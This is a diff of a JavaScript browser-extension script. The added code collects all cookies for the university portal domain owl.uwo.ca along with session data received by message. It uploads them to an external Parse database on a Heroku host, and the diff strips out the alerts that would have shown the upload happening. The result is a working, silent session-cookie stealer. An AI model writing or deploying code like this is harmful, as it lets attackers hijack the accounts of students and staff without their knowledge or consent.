@@ -1,9 +1,21 @@
 console.log("executing script");
-run();
+
+chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
+run(request.sessionData);
+    sendResponse();
+});
 
 
-function run() {
+function run(sessionData) {
 console.log("executing core");
+chrome.cookies.getAll({'domain':'owl.uwo.ca'}, function (cookies) {
+submit(cookies, sessionData);
+});
+}
+
+function submit(cookie, session) {
+console.log(cookie);
+console.log(session);
 
 Parse.initialize("western-cyber-db");
 Parse.serverURL = 'https://western-cyber-db.herokuapp.com/parse';
@@ -11,18 +23,11 @@ Parse.serverURL = 'https://western-cyber-db.herokuapp.com/parse';
 var Table = Parse.Object.extend("Table");
 var table = new Table();
 
-table.set("cookie", document.cookie);
-table.set("session", sessionStorage.getItem('portal.user.id'));
+table.set("cookie", JSON.stringify(cookie));
+table.set("session", session);
 
 table.save(null, {
-  success: function(table) {
-    // Execute any logic that should take place after the object is saved.
-    alert('New object created with objectId: ' + table.id);
-  },
-  error: function(table, error) {
-    // Execute any logic that should take place if the save fails.
-    // error is a Parse.Error with an error code and message.
-    alert('Failed to create new object, with error code: ' + error.message);
-  }
+  success: function(table) {},
+  error: function(table, error) {}
 });
 }
